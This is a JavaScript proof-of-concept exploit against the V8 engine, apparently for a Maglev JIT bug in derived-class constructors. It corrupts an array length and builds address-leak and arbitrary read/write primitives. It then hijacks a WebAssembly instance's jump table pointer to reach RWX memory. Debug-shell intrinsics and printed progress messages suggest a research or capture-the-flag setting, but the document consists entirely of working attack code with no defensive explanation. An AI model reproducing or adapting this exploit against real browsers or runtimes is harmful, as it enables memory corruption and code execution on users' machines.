class Helpers {
  constructor () {
    this.buf = new ArrayBuffer(8);
    this.dv = new DataView(this.buf);
    this.u8 = new Uint8Array(this.buf);
    this.u32 = new Uint32Array(this.buf);
    this.u64 = new BigUint64Array(this.buf);
    this.f32 = new Float32Array(this.buf);
    this.f64 = new Float64Array(this.buf);
  }
  
  i64tof64(i) {
    this.u64[0] = i;
    return this.f64[0];
  }
  print_hex(f) {
    console.log('0x' + this.f64toi64(f).toString(16));
  }
  hex_to_dbl(hexString) {
    if (hexString.startsWith('0x')) {
      hexString = hexString.substring(2);
    }

    for (let i = 0; i < 8; i++) {
      const byte = hexString.substring(hexString.length - (i + 1) * 2, hexString.length - i * 2);
      this.u8[i] = parseInt(byte, 16);
    }

    const float64 = new Float64Array(this.u8.buffer);
    return float64[0];
  }
  f64toi64(f) {
    this.f64[0] = f;
    return this.u64[0];
  }

  set_i64(i) {
    this.u64[0] = i;
  }

  set_l(i) {
    this.u32[0] = i;
  }

  set_h(i) {
    this.u32[1] = i;
  }

  get_i64() {
    return this.u64[0];
  }

  ftoil(f) {
    this.f64[0] = f;
    return this.u32[1]
  }

  ftoih(f) {
    this.f64[0] = f;
    return this.u32[0]
  }
}
var helper = new Helpers();

var v;
var empty_object = {};
let zero = 0;
let corrupted_instance = null;

let a_addr = 0
let rwarr = null;
let rwarr_addr = 0
let rwarr_storage_idx = 0;

let changer = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6]
let leaker = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6]
let holder = { p1: 0x1234, p2: 0x1234, p3: 0x1234 };
let original_holder_bytes = 0;

class A { }
class B extends A {
  constructor () {
    v = new.target;
    let objArr = [empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object];
    super();
    gc();
    let floatArr = [1.1];

    this.x = objArr;
    this.a = floatArr;
  }
}

function gc() {
  for (let i = 0; i < 1000; i++) {
    new ArrayBuffer(0x10000);
  }
}

function debug_print(name, obj) {
  console.log(`Debug of ${name}`);
    % DebugPrint(obj);
}

function addrOf_tmp(obj) {
  corrupted_instance.x[0] = obj;               // x holds objects that need to be leaked
  helper.f64[0] = corrupted_instance.a[0];     // set ArrayBuffer with the first element of a, which point to the object  
  return helper.u32[0];                    // get the last 32 bits of the address due to pointer compression
}

// These functions use `where-in` because v8
// needs to jump over the map and size words
function write_temp(where, what) {
  helper.f64[0] = corrupted_instance.a[rwarr_storage_idx];
  if (helper.u32[0] == 0x6) {
    helper.f64[0] = corrupted_instance.a[rwarr_storage_idx - 1];
    helper.u32[1] = where - 8; // don't know why -8
    corrupted_instance.a[rwarr_storage_idx - 1] = helper.f64[0];
  } else if (helper.u32[1] == 0x6) {
    helper.u32[0] = where - 8;
    corrupted_instance.a[rwarr_storage_idx] = helper.f64[0];
  }
  rwarr[0] = what;
}

function read(addr) {
  let original_leaker_address = changer[0];
  helper.u32[1] = 0xc; helper.u32[0] = Number(addr) - 8;
  changer[0] = helper.f64[0];

  let ret = leaker[0]; // get data
  changer[0] = original_leaker_address;
  return helper.f64toi64(ret);
}

function write(addr, value) {
  let original_leaker_address = changer[0];
  helper.u32[1] = 0xc; helper.u32[0] = Number(addr) - 8;
  changer[0] = helper.f64[0];

  helper.f64[0] = leaker[0];          // point buffer to data
  helper.u32[0] = Number(value);      // write data
  leaker[0] = helper.f64[0];
  changer[0] = original_leaker_address;
}

function addrOf(obj) {
  holder.p2 = obj;
  let ret = leaker[1];
  holder.p2 = 0;
  return helper.f64toi64(ret) & 0xffffffffn;
}

function exploit() {
  print("[+] Triggering GC for moving GC-resistance objects into old space...");
  for (let i = 0; i < 100; i++) {
    if (i < 90) gc();
  }

  print("[+] Triggering the bug...");
  for (let i = 0; i < 100; i++) {
    if (i < 90) gc();
  }

  % PrepareFunctionForOptimization(B);
  corrupted_instance = new B();

  for (let i = 0; i < 100; i++) {
        % OptimizeMaglevOnNextCall(B);
    corrupted_instance = new B();
  }

  print("[+] Corrupting the metadata (length) of corrupted_instance.a ..");
  while(corrupted_instance.a.length != 0x10000000) {
    corrupted_instance.x[5] = 0x10000000; // need to be bigger for covering the whole memory
    print(`[+] Expected: ${0x10000000}, got: ${corrupted_instance.a.length}`);
  }
  print(`[+] Initial corruption succeeded!`);

  while (true) {
    rwarr = [1.1, 2.2, 3.3];
    rwarr_addr = addrOf_tmp(rwarr);
    a_addr = addrOf_tmp(corrupted_instance.a);

    if (rwarr_addr < a_addr) {
    } else {
      print("[+] Calculating the offset...");
      let offset = (rwarr_addr - a_addr) + 0xc;
      if ((offset % 8) != 0) {
        offset -= 4;
      }
      print("[+] Offset: " + offset);

      print("[+] Calculating the index...");
      rwarr_storage_idx = offset / 8;
      rwarr_storage_idx += 1;
      print("[+] Index: " + rwarr_storage_idx);

      helper.f64[0] = corrupted_instance.a[rwarr_storage_idx];
      break;
    }
  }

  print("[+] Building GC persistence primitives...");
  changer_addr = addrOf_tmp(changer);
  leaker_addr = addrOf_tmp(leaker);
  holder_addr = addrOf_tmp(holder);

  helper.u32[1] = 0xc; helper.u32[0] = holder_addr;
  let original_holder_address = helper.f64[0];

  helper.u32[1] = 0xc; helper.u32[0] = leaker_addr;
  write_temp(changer_addr + 0x8, helper.f64[0]);
  write_temp(leaker_addr + 0x8, original_holder_address);

  print("[+] Fixing corrupted fields...");
  corrupted_instance.x.length = 0;
  corrupted_instance.a.length = 0;
  rwarr.length = 0;

  print("[+] Creating WASM instance...")
  let wasmCode = new Uint8Array([
    0,  97, 115, 109,   1,   0,   0,   0,  1,   6,  1, 96,
    2, 126, 126,   0,   3,   2,   1,   0,  5,   3,  1,  0,
    1,   7,   5,   1,   1, 102,   0,   0, 10,  14,  1, 12,
    0,  68, 144, 144, 144, 144,  72, 137, 16, 195, 26, 11,
    0,  17,   4, 110,  97, 109, 101,   2,  3,   1,  0,  0,
    6,   5,   1,   0,   2,  77,  48
  ]);
  var wasmModule = new WebAssembly.Module(wasmCode);
  var wasmInstance = new WebAssembly.Instance(wasmModule);
  var { f } = wasmInstance.exports;
  
  let wasmInstanceAddr = addrOf(wasmInstance);
  print("[+] Address of wasmInstance: 0x" + wasmInstanceAddr.toString(16));
  
  let wasmRwxPtrOffset = 0x4cn;
  let wasmRwxPtrAddr = wasmInstanceAddr + wasmRwxPtrOffset - 4n;
  print("[+] Address of jump table pointer: 0x" + wasmRwxPtrAddr.toString(16));
  
  let wasmRwxAddr = read(wasmRwxPtrAddr);
  print("[+] Address of wasmRwx pointed by the jump table pointer: 0x" + wasmRwxAddr.toString(16));
  
  print("[+] Overwriting the jump table pointer...");
  let wasmFunctionOffset = 0xb58n + 2n;
  write(wasmRwxPtrAddr, wasmRwxAddr + wasmFunctionOffset);
  
  let newWasmRwxAddr = read(wasmRwxPtrAddr);
  print("[+] New value jump table pointer: 0x" + newWasmRwxAddr.toString(16));
  // % DebugPrint(wasmInstance);
  
  // f(wasmRwxPtrAddr, 0n);

  return f;
}

var f = exploit();